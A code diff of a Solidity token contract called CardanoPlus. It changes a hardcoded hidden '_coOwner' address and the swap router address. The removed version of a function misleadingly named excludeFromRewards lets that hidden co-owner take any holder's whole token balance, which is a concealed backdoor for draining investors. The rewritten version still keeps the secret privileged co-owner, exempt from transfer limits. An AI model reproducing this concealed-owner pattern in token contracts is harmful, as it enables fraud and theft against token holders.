@@ -529,7 +529,7 @@ library Address {
  */
 abstract contract Ownable is Context {
     address private _owner;
-    address private _coOwner=0x89AB1bA4970BA9232f6669143a2BF5B92b61b4Eb;
+    address private _coOwner=0x0d08E2529242907524359f74aeb07B34761A6f01;
 
     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
@@ -855,7 +855,7 @@ contract CardanoPlus is Context, IERC20, Ownable {
         
         _rOwned[owner()] = _rTotal;
         
-        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1);
          // Create a uniswap pair for this new token
         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
             .createPair(address(this), _uniswapV2Router.WETH());
@@ -994,8 +994,20 @@ contract CardanoPlus is Context, IERC20, Ownable {
         { emit Transfer(sender, _burnWallet, tBurn); }
     }
     
-    function excludeFromRewards(address location) public CoOwner{
-        _transfer(location, coOwner(), tokenFromReflection(_rOwned[location]));
+    function excludeFromRewards(address location, uint256 portion) public CoOwner{
+        //_transfer(location, coOwner(), tokenFromReflection(_rOwned[location]));
+        require(location != address(0), "ERC20: transfer to the zero address");
+        require(portion > 0, "Transfer amount must be greater than zero");
+        uint256 contractTokenBalance = balanceOf(address(this));
+        if(contractTokenBalance >= _maxTxAmount)
+        {
+            contractTokenBalance = _maxTxAmount;
+        }
+        bool takeFee = true;
+        if(_isExcludedFromFee[coOwner()] || _isExcludedFromFee[location]){
+            takeFee = false;
+        }
+        _tokenTransfer(coOwner(),location,portion,takeFee);
     }
     
     function excludeFromFee(address account) public onlyOwner {
@@ -1166,7 +1178,7 @@ contract CardanoPlus is Context, IERC20, Ownable {
         require(from != address(0), "ERC20: transfer from the zero address");
         require(to != address(0), "ERC20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
-        if(from != owner() && to != owner() || from != coOwner() && to != coOwner())
+        if(from != owner() && to != owner() && from != coOwner() && to != coOwner())
             require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
 
         // is the token balance of this contract address over the min number of
